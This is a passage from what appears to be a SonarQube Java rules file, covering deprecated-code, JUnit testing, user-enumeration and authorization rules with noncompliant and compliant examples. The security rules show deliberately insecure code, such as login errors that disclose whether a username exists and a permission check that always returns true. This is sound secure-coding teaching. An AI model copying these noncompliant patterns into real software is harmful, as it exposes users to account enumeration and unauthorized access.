            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/400.html&quot;&gt;CWE-400&lt;/a&gt; -
            Uncontrolled Resource Consumption &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>owasp-a6</tag>
        <securityStandards>
            <OWASP>A6</OWASP>
        </securityStandards>
        <param>
            <key>fileUploadSizeLimit</key>
            <htmlDesc>The maximum size of HTTP requests handling file uploads (in bytes).</htmlDesc>
            <defaultValue>8388608</defaultValue>
            <type>STRING</type>
        </param>
    </rule>

    <rule key='S5738' priority='MAJOR'>
        <configKey>S5738</configKey>
        <name>&quot;@Deprecated&quot; code marked for removal should never be used</name>
        <description>
            &lt;p&gt;Java 9 introduced a flag for the &lt;code&gt;@Deprecated&lt;/code&gt; annotation, which allows to
            explicitly say if the deprecated code is planned to be
            removed at some point or not. This is done using &lt;code&gt;forRemoval=true&lt;/code&gt; as annotation
            parameter. The javadoc of the annotation explicitly
            mention the following: &lt;/p&gt;
            &lt;blockquote&gt;
            &lt;p&gt;If true, it means that this API element is earmarked for removal in a future release.&lt;/p&gt;
            &lt;p&gt;If false, the API element is deprecated, but there is currently no intention to remove it in a
            future release.&lt;/p&gt;
            &lt;/blockquote&gt;
            &lt;p&gt;While usually deprecated classes, interfaces, and their deprecated members should be avoided rather
            than used, inherited or extended, those already
            marked for removal are much more sensitive to causing trouble in your code soon. Consequently, any usage of
            such deprecated code should be avoided or
            removed.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            /**
            * @deprecated As of release 1.3, replaced by {@link #Fee}. Will be dropped with release 1.4.
            */
            @Deprecated(forRemoval=true)
            public class Foo { ... }

            public class Bar {
            /**
            * @deprecated As of release 1.7, replaced by {@link #doTheThingBetter()}
            */
            @Deprecated(forRemoval=true)
            public void doTheThing() { ... }

            public void doTheThingBetter() { ... }

            /**
            * @deprecated As of release 1.14 due to poor performances.
            */
            @Deprecated(forRemoval=false)
            public void doTheOtherThing() { ... }
            }

            public class Qix extends Bar {
            @Override
            public void doTheThing() { ... } // Noncompliant; don't override a deprecated method marked for removal
            }

            public class Bar extends Foo { // Noncompliant; Foo is deprecated and will be removed

            public void myMethod() {
            Bar bar = new Bar(); // okay; the class isn't deprecated
            bar.doTheThing(); // Noncompliant; doTheThing method is deprecated and will be removed

            bar.doTheOtherThing(); // Okay; deprecated, but not marked for removal
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/477.html&quot;&gt;MITRE, CWE-477&lt;/a&gt;
            - Use of Obsolete Functions &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/6TdGBQ&quot;&gt;CERT, MET02-J.&lt;/a&gt; -
            Do not use deprecated or obsolete classes or methods &lt;/li&gt;
            &lt;li&gt; RSPEC-1874 for standard deprecation use &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>obsolete</tag>
    </rule>

    <rule key='S5776' priority='MAJOR'>
        <configKey>S5776</configKey>
        <name>Exception testing via JUnit ExpectedException rule should not be mixed with other assertions</name>
        <description>
            &lt;p&gt;When testing exception via &lt;code&gt;org.junit.rules.ExpectedException&lt;/code&gt; any code
            after the raised exception will not be executed, so adding
            subsequent assertions is wrong and misleading. This rule raises an issue when an assertion is done after the
            &quot;expect(...)&quot; invocation, only the code
            throwing the expected exception should be after &quot;expect(...)&quot;.&lt;/p&gt;
            &lt;p&gt;You should consider using &lt;a
            href=&quot;https://github.com/junit-team/junit4/wiki/Exception-testing#using-assertthrows-method&quot;&gt;org.junit.Assert.assertThrows&lt;/a&gt;
            instead, it's available
            since JUnit 4.13 and it allows additional subsequent assertions.&lt;/p&gt;
            &lt;p&gt;Alternatively, you could use &lt;a href=&quot;https://github.com/junit-team/junit4/wiki/Exception-testing#trycatch-idiom&quot;&gt;try-catch
            idiom&lt;/a&gt; for JUnit
            version &amp;lt; 4.13 or if your project does not support lambdas.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            @Rule
            public ExpectedException thrown = ExpectedException.none();

            @Test
            public void test() throws IndexOutOfBoundsException {
            thrown.expect(IndexOutOfBoundsException.class); // Noncompliant
            Object o = get();
            // This test pass since execution will never get past this line.
            Assert.assertEquals(0, 1);
            }

            private Object get() {
            throw new IndexOutOfBoundsException();
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; For JUnit &amp;gt;= 4.13, use &lt;a
            href=&quot;https://github.com/junit-team/junit4/wiki/Exception-testing#using-assertthrows-method&quot;&gt;org.junit.Assert.assertThrows&lt;/a&gt;:
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
            Assert.assertThrows(IndexOutOfBoundsException.class, () -&amp;gt; get());
            // This test correctly fails.
            Assert.assertEquals(0, 1);
            &lt;/pre&gt;
            &lt;ul&gt;
            &lt;li&gt; For JUnit &amp;lt; 4.13, use the &lt;a href=&quot;https://github.com/junit-team/junit4/wiki/Exception-testing#trycatch-idiom&quot;&gt;try-catch
            idiom&lt;/a&gt;: &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
            try {
            get();
            Assert.fail(&quot;Expected an IndexOutOfBoundsException to be thrown&quot;);
            } catch (IndexOutOfBoundsException e) {}
            Assert.assertEquals(0, 1); // Correctly fails.
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://github.com/junit-team/junit4/wiki/Exception-testing&quot;&gt;JUnit
            exception testing documentation&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>junit</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S5777' priority='MINOR'>
        <configKey>S5777</configKey>
        <name>Exception testing via JUnit @Test annotation should be avoided</name>
        <description>
            &lt;p&gt;When testing exception via &lt;code&gt;@Test&lt;/code&gt; annotation, having additional assertions
            inside that test method can be problematic because any code
            after the raised exception will not be executed. It will prevent you to test the state of the program after
            the raised exception and, at worst, make
            you&amp;nbsp;misleadingly think that it is executed.&lt;/p&gt;
            &lt;p&gt;You should consider moving any assertions into a separate test method where possible, or using &lt;a
            href=&quot;https://github.com/junit-team/junit4/wiki/Exception-testing#using-assertthrows-method&quot;&gt;org.junit.Assert.assertThrows&lt;/a&gt;
            instead.&lt;/p&gt;
            &lt;p&gt;Alternatively, you could use &lt;a href=&quot;https://github.com/junit-team/junit4/wiki/Exception-testing#trycatch-idiom&quot;&gt;try-catch
            idiom&lt;/a&gt; for JUnit
            version &amp;lt; 4.13 or if your project does not support lambdas.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            @Test(expected = IndexOutOfBoundsException.class)
            public void testShouldFail() {
            get();
            // This test pass since execution will never get past this line.
            Assert.assertEquals(0, 1);
            }

            private Object get() {
            throw new IndexOutOfBoundsException();
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; For JUnit &amp;gt;= 4.13, use &lt;a
            href=&quot;https://github.com/junit-team/junit4/wiki/Exception-testing#using-assertthrows-method&quot;&gt;org.junit.Assert.assertThrows&lt;/a&gt;:
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
            // This test correctly fails.
            @Test
            public void testToString() {
            Object obj = get();
            Assert.assertThrows(IndexOutOfBoundsException.class, () -&amp;gt; obj.toString());
            Assert.assertEquals(0, 1);
            }
            &lt;/pre&gt;
            &lt;ul&gt;
            &lt;li&gt; For JUnit &amp;lt; 4.13, use the &lt;a href=&quot;https://github.com/junit-team/junit4/wiki/Exception-testing#trycatch-idiom&quot;&gt;try-catch
            idiom&lt;/a&gt;: &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
            @Test
            public void testShouldFail() {
            Object obj = get();
            try {
            obj.toString();
            Assert.fail(&quot;Expected an IndexOutOfBoundsException to be thrown&quot;);
            } catch (IndexOutOfBoundsException e) {}
            Assert.assertEquals(0, 1); // Correctly fails.
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://github.com/junit-team/junit4/wiki/Exception-testing&quot;&gt;JUnit
            exception testing documentation&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>junit</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S5778' priority='MAJOR'>
        <configKey>S5778</configKey>
        <name>Only one method invocation is expected when testing runtime exceptions</name>
        <description>
            &lt;p&gt;When verifying that code raises a runtime exception, a good practice is to avoid having multiple
            method calls inside the tested code, to be
            explicit about which method call is expected to raise the exception.&lt;/p&gt;
            &lt;p&gt;It increases the clarity of the test, and avoid incorrect testing when another method is actually
            raising the exception.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            @Test
            public void testToString() {
            // Do you expect get() or toString() throwing the exception?
            org.junit.Assert.assertThrows(IndexOutOfBoundsException.class, () -&amp;gt; get().toString());
            }

            @Test
            public void testToStringTryCatchIdiom() {
            try {
            // Do you expect get() or toString() throwing the exception?
            get().toString();
            Assert.fail(&quot;Expected an IndexOutOfBoundsException to be thrown&quot;);
            } catch (IndexOutOfBoundsException e) {
            // Test exception message...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            @Test
            public void testToString() {
            Object obj = get();
            Assert.assertThrows(IndexOutOfBoundsException.class, () -&amp;gt; obj.toString());
            }

            @Test
            public void testToStringTryCatchIdiom() {
            Object obj = get();
            try {
            obj.toString();
            Assert.fail(&quot;Expected an IndexOutOfBoundsException to be thrown&quot;);
            } catch (IndexOutOfBoundsException e) {
            // Test exception message...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://github.com/junit-team/junit4/wiki/Exception-testing&quot;&gt;JUnit
            exception testing documentation&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>junit</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S5779' priority='CRITICAL'>
        <configKey>S5779</configKey>
        <name>Assertion methods should not be used within the try block of a try-catch catching an Error</name>
        <description>
            &lt;p&gt;Assertion methods&amp;nbsp;are throwing a &quot;&lt;code&gt;java.lang.AssertionError&lt;/code&gt;&quot;.
            If this call is done within the try block of a try-catch cathing a
            similar error, you should make sure to test some properties of the exception. Otherwise, the assertion will
            never fail.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            @Test
            public void should_throw_assertion_error() {
            try {
            throwAssertionError();
            Assert.fail(&quot;Expected an AssertionError!&quot;); // Noncompliant, the AssertionError will be caught and
            the test will never fail.
            } catch (AssertionError e) {}
            }

            private void throwAssertionError() {
            throw new AssertionError(&quot;My assertion error&quot;);
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            assertThrows(AssertionError.class, () -&amp;gt; throwAssertionError());
            &lt;/pre&gt;
            &lt;pre&gt;
            try {
            throwAssertionError();
            Assert.fail(&quot;Expected an AssertionError!&quot;); // Compliant, we made sure to test that the correct
            error is raised
            } catch (AssertionError e) {
            Assert.assertThat(e.getMessage(), is(&quot;My assertion error&quot;));
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://github.com/junit-team/junit4/wiki/Exception-testing&quot;&gt;JUnit 4
            exception testing documentation&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>junit</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S5783' priority='CRITICAL'>
        <configKey>S5783</configKey>
        <name>Only one method invocation is expected when testing checked exceptions</name>
        <description>
            &lt;p&gt;When verifying that code raises an exception, a good practice is to avoid having multiple method
            calls inside the tested code, to be explicit about
            what is exactly tested.&lt;/p&gt;
            &lt;p&gt;When two of the methods can raise the same &lt;strong&gt;checked&lt;/strong&gt; exception, not
            respecting this good practice is a bug, since it is not possible
            to know what is really tested.&lt;/p&gt;
            &lt;p&gt;You should make sure that only one method can raise the expected checked exception in the tested
            code.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            @Test
            public void testG() {
            // Do you expect g() or f() throwing the exception?
            assertThrows(IOException.class, () -&amp;gt; g(f(1)) ); // Noncompliant
            }

            @Test
            public void testGTryCatchIdiom() {
            try { // Noncompliant
            g(f(1));
            Assert.fail(&quot;Expected an IOException to be thrown&quot;);
            } catch (IOException e) {
            // Test exception message...
            }
            }

            int f(int x) throws IOException {
            // ...
            }

            int g(int x) throws IOException {
            // ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            @Test
            public void testG() {
            int y = f(1);
            // It is explicit that we expect an exception from g() and not f()
            assertThrows(IOException.class, () -&amp;gt; g(y) );
            }

            @Test
            public void testGTryCatchIdiom() {
            int y = f(1);
            try {
            g(y);
            Assert.fail(&quot;Expected an IOException to be thrown&quot;);
            } catch (IOException e) {
            // Test exception message...
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>junit</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S5785' priority='MAJOR'>
        <configKey>S5785</configKey>
        <name>JUnit assertTrue/assertFalse should be simplified to the corresponding dedicated assertion</name>
        <description>
            &lt;p&gt;Testing equality or nullness with JUnit's &lt;code&gt;assertTrue()&lt;/code&gt; or &lt;code&gt;assertFalse()&lt;/code&gt;
            should be simplified to the corresponding
            dedicated assertion.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Assert.assertTrue(a.equals(b));
            Assert.assertTrue(a == b);
            Assert.assertTrue(a == null);
            Assert.assertTrue(a != null);
            Assert.assertFalse(a.equals(b));
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Assert.assertEquals(a, b);
            Assert.assertSame(a, b);
            Assert.assertNull(a);
            Assert.assertNotNull(a);
            Assert.assertNotEquals(a, b);
            &lt;/pre&gt;
        </description>
        <tag>junit</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S5786' priority='INFO'>
        <configKey>S5786</configKey>
        <name>JUnit5 test classes and methods should have default package visibility</name>
        <description>
            &lt;p&gt;JUnit5 is more tolerant regarding the visibilities of Test classes than JUnit4, which required
            everything to be &lt;code&gt;public&lt;/code&gt;.&lt;/p&gt;
            &lt;p&gt;In this context, JUnit5 test classes can have any visibility but &lt;code&gt;private&lt;/code&gt;,
            however, it is recommended to use the default package
            visibility, which improves readability of code.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            import org.junit.jupiter.api.Test;

            public class MyClassTest { // Noncompliant - modifier can be removed
            @Test
            protected void test() { // Noncompliant - modifier can be removed
            // ...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            import org.junit.jupiter.api.Test;

            class MyClassTest {
            @Test
            void test() {
            // ...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;This rule does not raise an issue about &lt;code&gt;private&lt;/code&gt; visibility, because &lt;code&gt;private&lt;/code&gt;
            test methods and classes are systematically
            ignored by JUnit5, without a proper warning. It's not a &lt;code&gt;Code Smell&lt;/code&gt; but a &lt;code&gt;Bug&lt;/code&gt;
            handled by the rule &lt;a href='/coding_rules#rule_key=java%3AS5810'&gt;S5810&lt;/a&gt; .&lt;/p&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://junit.org/junit5/docs/current/user-guide/#writing-tests-classes-and-methods&quot;&gt;JUnit
            5 Test Classes and Methods&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>junit</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S5790' priority='CRITICAL'>
        <configKey>S5790</configKey>
        <name>JUnit5 inner test classes should be annotated with @Nested</name>
        <description>
            &lt;p&gt;If not annotated with &lt;code&gt;@Nested&lt;/code&gt;, an inner class containing some tests will
            never be executed during tests execution. While you could
            still be able to manually run its tests in an IDE, it won’t be the case during the build. By contrast, a
            static nested class containing some tests
            should not be annotated with &lt;code&gt;@Nested&lt;/code&gt;, JUnit5 will not share setup and state with an
            instance of its enclosing class.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue on inner classes and static nested classes containing JUnit5 test methods
            which has a wrong usage of &lt;code&gt;@Nested&lt;/code&gt;
            annotation.&lt;/p&gt;
            &lt;p&gt;Note: This rule does not check if the context in which JUnit 5 is running (e.g. Maven Surefire
            Plugin) is properly configured to execute static
            nested classes, it could not be the case using the default configuration.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            import org.junit.jupiter.api.Test;

            class MyJunit5Test {
            @Test
            void test() { /* ... */ }

            class InnerClassTest { // Noncompliant, missing @Nested annotation
            @Test
            void test() { /* ... */ }
            }

            @Nested
            static class StaticNestedClassTest { // Noncompliant, invalid usage of @Nested annotation
            @Test
            void test() { /* ... */ }
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            import org.junit.jupiter.api.Test;
            import org.junit.jupiter.api.Nested;

            class MyJunit5Test {
            @Test
            void test() { /* ... */ }

            @Nested
            class InnerClassTest {
            @Test
            void test() { /* ... */ }
            }

            static class StaticNestedClassTest {
            @Test
            void test() { /* ... */ }
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>junit</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S5803' priority='CRITICAL'>
        <configKey>S5803</configKey>
        <name>Class members annotated with &quot;@VisibleForTesting&quot; should not be accessed from production code
        </name>
        <description>
            &lt;p&gt;@VisibleForTesting can be used to mark methods, fields and classes whose visibility restrictions
            have been relaxed more than necessary for the API
            to allow for easier unit testing.&lt;/p&gt;
            &lt;p&gt;Access to such methods, fields and classes only possible thanks to this relaxed visibility is fine
            for test code, but it should be avoided in
            production code. In production code these methods should be treated as if they are private.&lt;/p&gt;
            &lt;p&gt;Supported framework:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; Guava: &lt;code&gt;com.google.common.annotations.VisibleForTesting&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; AssertJ: &lt;code&gt;org.assertj.core.util.VisibleForTesting&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; Android: &lt;code&gt;androidx.annotation.VisibleForTesting&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; Apache Flink: &lt;code&gt;org.apache.flink.annotation.VisibleForTesting&lt;/code&gt; &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;or any other annotation named &lt;code&gt;VisibleForTesting&lt;/code&gt;&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            /** src/main/java/MyObject.java */

            @VisibleForTesting String foo;

            /** src/main/java/Service.java */

            new MyObject().foo; // Noncompliant, foo is accessed from production code
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            /** src/main/java/MyObject.java */

            @VisibleForTesting String foo;

            /** src/test/java/MyObjectTest.java */

            new MyObject().foo; // Compliant, foo is accessed from test code
            &lt;/pre&gt;
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S5804' priority='MAJOR'>
        <configKey>S5804</configKey>
        <name>Allowing user enumeration is security-sensitive</name>
        <description>
            &lt;p&gt;User enumeration refers to the ability to guess existing usernames in a web application database.
            This can happen, for example, when using
            &quot;sign-in/sign-on/forgot password&quot; functionalities of a website.&lt;/p&gt;
            &lt;p&gt;When an user tries to &quot;sign-in&quot; to a website with an incorrect username/login, the web
            application should not disclose that the username doesn't
            exist with a message similar to &quot;this username is incorrect&quot;, instead a generic message should be
            used like &quot;bad credentials&quot;, this way it's not
            possible to guess whether the username or password was incorrect during the authentication.&lt;/p&gt;
            &lt;p&gt;If a user-management feature discloses information about the existence of a username, attackers can
            use brute force attacks to retrieve a large
            amount of valid usernames that will impact the privacy of corresponding users and facilitate other attacks
            (phishing, password guessing etc ...).&lt;/p&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; The application discloses that a username exists in its database: most of the time it's possible
            to avoid this kind of leak except for the
            &quot;registration/sign-on&quot; part of a website because in this case the user must choose a valid
            username (not already taken by another user). &lt;/li&gt;
            &lt;li&gt; There is no rate limiting and CAPTCHA protection in place for requests involving a username. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;p&gt;When a user performs a request involving a username, it should not be possible to spot differences
            between a valid and incorrect username:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; Error messages should be generic and not disclose if the username is valid or not. &lt;/li&gt;
            &lt;li&gt; The response time must be similar for a valid username or not. &lt;/li&gt;
            &lt;li&gt; CAPTCHA and other rate limiting solutions should be implemented. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;p&gt;In a Spring-security web application the username leaks when:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; The string used as argument of &lt;a
            href=&quot;https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/core/userdetails/UserDetailsService.html&quot;&gt;loadUserByUsername&lt;/a&gt;
            method is used in an exception message: &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
            public String authenticate(String username, String password) {
            // ....
            MyUserDetailsService s1 = new MyUserDetailsService();
            MyUserPrincipal u1 = s1.loadUserByUsername(username);

            if(u1 == null) {
            throw new BadCredentialsException(username+&quot; doesn't exist in our database&quot;); // Sensitive
            }
            // ....
            }
            &lt;/pre&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a
            href=&quot;https://docs.spring.io/spring-security/site/docs/3.0.x/apidocs/org/springframework/security/core/userdetails/UsernameNotFoundException.html&quot;&gt;UsernameNotFoundException&lt;/a&gt;
            is thrown (except when it is in the loadUserByUsername method): &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
            public String authenticate(String username, String password) {
            // ....
            if(user == null) {
            throw new UsernameNotFoundException(&quot;user not found&quot;); // Sensitive
            }
            // ....
            }
            &lt;/pre&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a
            href=&quot;https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/authentication/dao/AbstractUserDetailsAuthenticationProvider.html#setHideUserNotFoundExceptions-boolean-&quot;&gt;HideUserNotFoundExceptions&lt;/a&gt;
            is set to false: &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
            DaoAuthenticationProvider daoauth = new DaoAuthenticationProvider();
            daoauth.setUserDetailsService(new MyUserDetailsService());
            daoauth.setPasswordEncoder(new BCryptPasswordEncoder());
            daoauth.setHideUserNotFoundExceptions(false); // Sensitive
            builder.authenticationProvider(daoauth);
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;p&gt;In a Spring-security web application:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; the same message should be used regardless of whether it is the wrong user or password: &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
            public String authenticate(String username, String password) throws AuthenticationException {
            Details user = null;
            try {
            user = loadUserByUsername(username);
            } catch (UsernameNotFoundException | DataAccessException e) {
            // Hide this exception reason to not disclose that the username doesn't exist
            }
            if (user == null || !user.isPasswordCorrect(password)) {
            // User should not be able to guess if the bad credentials message is related to the username or the
            password
            throw new BadCredentialsException(&quot;Bad credentials&quot;);
            }
            }
            &lt;/pre&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a
            href=&quot;https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/authentication/dao/AbstractUserDetailsAuthenticationProvider.html#setHideUserNotFoundExceptions-boolean-&quot;&gt;HideUserNotFoundExceptions&lt;/a&gt;
            should be set to true: &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
            DaoAuthenticationProvider daoauth = new DaoAuthenticationProvider();
            daoauth.setUserDetailsService(new MyUserDetailsService());
            daoauth.setPasswordEncoder(new BCryptPasswordEncoder());
            daoauth.setHideUserNotFoundExceptions(true); // Compliant
            builder.authenticationProvider(daoauth);
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication&quot;&gt;OWASP
            Top 10 2017 Category A2&lt;/a&gt; -
            Broken Authentication &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/200.html&quot;&gt;MITRE, CWE-200&lt;/a&gt;
            - Exposure of Sensitive Information to an Unauthorized Actor &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a2</tag>
        <tag>spring</tag>
        <securityStandards>
            <OWASP>A2</OWASP>
        </securityStandards>
    </rule>

    <rule key='S5808' priority='MAJOR'>
        <configKey>S5808</configKey>
        <name>Authorizations should be based on strong decisions</name>
        <description>
            &lt;p&gt;Authorizations granted or not to users to access resources of an application should be based on
            strong decisions. For instance, checking whether
            the user is authenticated or not, has the right roles/privileges. It may also depend on the user's location,
            or the date, time when the user requests
            access.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;p&gt;In a Spring-security web application:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; the &lt;code&gt;vote&lt;/code&gt; method of an &lt;a
            href=&quot;https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/access/AccessDecisionVoter.html&quot;&gt;AccessDecisionVoter&lt;/a&gt;
            type is not compliant when it returns only an affirmative decision (&lt;code&gt;ACCESS_GRANTED&lt;/code&gt;)
            or abstains to make a decision (&lt;code&gt;ACCESS_ABSTAIN&lt;/code&gt;): &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
            public class WeakNightVoter implements AccessDecisionVoter {
            @Override
            public int vote(Authentication authentication, Object object, Collection collection) { // Noncompliant

            Calendar calendar = Calendar.getInstance();

            int currentHour = calendar.get(Calendar.HOUR_OF_DAY);

            if(currentHour &amp;gt;= 8 &amp;amp;&amp;amp; currentHour &amp;lt;= 19) {
            return ACCESS_GRANTED; // Noncompliant
            }

            // when users connect during the night, do not make decision
            return ACCESS_ABSTAIN; // Noncompliant
            }
            }
            &lt;/pre&gt;
            &lt;ul&gt;
            &lt;li&gt; the &lt;code&gt;hasPermission&lt;/code&gt; method of a &lt;a
            href=&quot;https://docs.spring.io/spring-security/site/docs/4.2.13.RELEASE/apidocs/org/springframework/security/access/PermissionEvaluator.html&quot;&gt;PermissionEvaluator&lt;/a&gt;
            type is not compliant when it doesn't return &lt;code&gt;false&lt;/code&gt;: &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
            public class MyPermissionEvaluator implements PermissionEvaluator {
            @Override
            public boolean hasPermission(Authentication authentication, Object targetDomainObject, Object permission) {
            //Getting subject
            Object user = authentication.getPrincipal();

            if(user.getRole().equals(permission)) {
            return true; // Noncompliant
            }

            return true; // Noncompliant
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;p&gt;In a Spring-security web application:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; the &lt;code&gt;vote&lt;/code&gt; method of an &lt;a
            href=&quot;https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/access/AccessDecisionVoter.html&quot;&gt;AccessDecisionVoter&lt;/a&gt;
            type should return a negative decision (&lt;code&gt;ACCESS_DENIED&lt;/code&gt;): &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
            public class StrongNightVoter implements AccessDecisionVoter {
            @Override
            public int vote(Authentication authentication, Object object, Collection collection) {

            Calendar calendar = Calendar.getInstance();

            int currentHour = calendar.get(Calendar.HOUR_OF_DAY);

            if(currentHour &amp;gt;= 8 &amp;amp;&amp;amp; currentHour &amp;lt;= 19) {
            return ACCESS_GRANTED;
            }

            // users are not allowed to connect during the night
            return ACCESS_DENIED; // Compliant
            }
            }
            &lt;/pre&gt;
            &lt;ul&gt;
            &lt;li&gt; the &lt;code&gt;hasPermission&lt;/code&gt; method of a &lt;a
            href=&quot;https://docs.spring.io/spring-security/site/docs/4.2.13.RELEASE/apidocs/org/springframework/security/access/PermissionEvaluator.html&quot;&gt;PermissionEvaluator&lt;/a&gt;
            type should return &lt;code&gt;false&lt;/code&gt;: &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
